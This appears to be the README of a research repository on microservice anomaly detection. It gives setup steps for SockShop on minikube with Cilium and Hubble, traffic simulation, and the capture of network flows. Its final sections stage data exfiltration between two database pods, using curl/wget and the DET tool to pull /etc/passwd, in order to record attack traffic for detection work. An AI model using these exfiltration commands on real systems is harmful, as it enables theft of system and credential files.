# Microservice Anomaly Detection
Brian: I want this repository to become the central repository for all things microservice related.
It is a mess and we need to cleanup the whole repository

## Deploying SockShop
1. Optional: Install minikube
2. Optional: Set minikube config to have enough memory and cpu (sets default)
   1. `minikube config set memory 16384`
   2. `minikube config set cpus 10`
3. Optional: If you want to use cilium install cilium `bash install_cilium.sh`
4. Create a profile for your cluster: `minikube profile CLUSTER_NAME`
5. Start minikube: 
   1. Without cilium: `minikube start -p CLUSTER_NAME --memory 8192 --cpus 5`
   2. If using cilium (cilium must be installed): `minikube start --cni=cilium -p CLUSTER_NAME --memory 8192 --cpus 5`
6. Deploy SockShop: `bash deploy_sockshop.sh`

Check status of pods: `kubectl get pods --namespace sock-shop`

Get IP of front-end service: `minikube service --profile CLUSTER_NAME --url front-end -n sock-shop` 

Test if it is working `curl http://192.168.49.2:30001` or go to link in browser

## Debugging cilium connectivity 
1. Follow the guide for first time : https://kubernetes.io/docs/tasks/administer-cluster/network-policy-provider/cilium-network-policy/
2. Use https://docs.cilium.io/en/stable/gettingstarted/k8s-install-default/ to run tests : cilium connectivity test and cilium status --wait to verify outputs match.

## Simulating Traffic on SockShop
1. cd into `experiment_coordinator`
2. Setup a conda environment: `conda env create -f condaEnv.yml`
3. Cd into `traffic_simulation`
4. Activate conda env: `conda activate sockShop`
If you need to populate the database full of users: `python simulate_traffic.py -p`
4. Simulate traffic: `python simulate_traffic.py -t`

## Collecting Data with Cilium
1. To deploy cilium: `bash deploy_cilium.sh`
2. Test if its working: `cilium connectivity test`
3. Check if hubble is collecting flows : `hubble status`
4. To start collecting `hubble observe -n sock-shop -o json`

Cilium Documentation: https://docs.cilium.io/en/stable/gettingstarted/

## Todo
1. Cleanup Repository
2. Fix Cilium data collection
3. Run data exfiltration attack

## Deployment Instruction [Kirtan]
1. Start minikube: `minikube start --network-plugin=cni -p CLUSTER_NAME`
2. Enable cilium on minikube : `cilium install`
3. Verify cilium is enabled : `cilium status`
4. If you are running for the first time, verify cilium connectivity:`cilium connectivity test` : It takes couple of minutes for this to execute.
5. Enable hubble on cilium : `cilium hubble enable`
6. Enable port forwarding : `cilium hubble port-forward&`
7. Check if hubble is collecting flows : `hubble status`
8. Deploy SockShop: `bash deploy_sockshop.sh`

## DET tool setup
There are 2 containers: users-db and catalogue-db which allows installing dependencies needed by allowing apt-install and updates.
Hence, our goal is to make one of them our DET server i.e. one sending data and other one as client i.e. receiving data.

In order to do that, we first create an additional service on a new port of container users-db as container does not allow
us to run service on a new port once its turned on. Hence,  bash deploy_sockshop_with_det.sh will deploy
sockshop_modified_full_cluster_with_det.yaml which is same as deploy_sockshop_modified_full_cluster.yaml with a new port
added to users_db 27018  LOC :809 as well as a new Service user-db-det: LOC 844.

Here, we will use users_db as our server and catalogue_db as our client.


### Deploy Sock-shop with DET
1. run `bash deploy_sockshop_with_det.sh`

Once the sock-shop completes deployment,
### Getting needed metadata of user-db and catalogue-db pods
1. Get pod ids of users-db and catalogue-db from : `kubectl get pods  -n sock-shop` 
2. Get IP address of user-db-det from : `kubectl get services -o wide -n sock-shop`

### Preparing User-db for DET
1. SSH into users_db using `kubectl exec --stdin --tty user-db-XXXXXXX  --namespace sock-shop -- /bin/bash`
2. For simplehttpserver communication, run following commands:
   1. `apt-get -o Acquire::ForceIPv4=true update`
   2. `apt-get --force-yes -y -o Acquire::ForceIPv4=true install python`
3. For DET, run all the commands given in the file det_dependencies_to_install.txt    

### Preparing Catalogue-db for DET
1. SSH into users_db using `kubectl exec --stdin --tty catalogue-db-XXXXXXX  --namespace sock-shop -- /bin/bash`
2. For simplehttpserver communication, run following commands:
   1. `apt-get -o Acquire::ForceIPv4=true update`
   2. `apt-get --force-yes -y -o Acquire::ForceIPv4=true install curl wget`
3. For DET, run all the commands given in the file det_dependencies_to_install.txt   

### Annotating pods for datacollection
1. Annotate user-db pod for cilium data collection: `kubectl annotate pod user-db-XXXX -n sock-shop io.cilium.proxy-visibility="<Egress/27018/TCP/HTTP>,<Ingress/27018/TCP/HTTP>"`
2. Annotate catalogue-db pod for cilium data collection: `kubectl annotate pod catalogue-db-XXXXx -n sock-shop io.cilium.proxy-visibility="<Egress/27018/TCP/HTTP>,<Ingress/27018/TCP/HTTP>"`


### Turn on hubble data collection
1. Run this command to observe http traffic between server and client and write it to file : `hubble observe  --follow --protocol http -o json > det_data.txt`
2. Run this command to observe http traffic between server and client in command line : ` hubble observe  --follow --protocol http -o json `

### SimpleHTTPPythonServer DET
1. On users-db, start the python server on port 27018 : `python -m SimpleHTTPServer 27018`
2. On catalogue-db use wget/curl to retrieve files : `curl 10.103.13.14:27018/bin/sh` or `wget 10.103.13.14:27018/bin/bash`
3. Observe traffic in hubble

### DET using PaulSec/DET tool
Assuming you have installed all the commands in the det_dependencies_to_install.txt on both the catalogue-db and user-db, follow the next steps:
1. Install vim to edit config files for det on both the pods using : `apt-get update`; `apt search vim`; `apt-get install vim`
2. On user-db, 
   1. Open config-server.json and replace http port with 27018 on Line 5 and save the file
   2. Then start the DET server using following command : `python det.py -L -c ./config-server.json -p http`
3. On catalogue-db,
   1. Open config-client.json and replace http port with 27018 on Line 5 and replace IP address with whatever IP you got for user db in metadata colleciton.
   2. After that run the following command to retrieve file that you wish to retrieve: 
      1. `python det.py -c ./config-client.json -p http -f /etc/passwd`
   3. You can also configure max_time_sleep, min_time_sleep,max_bytes_read, min_bytes_read in the config files of both server and client


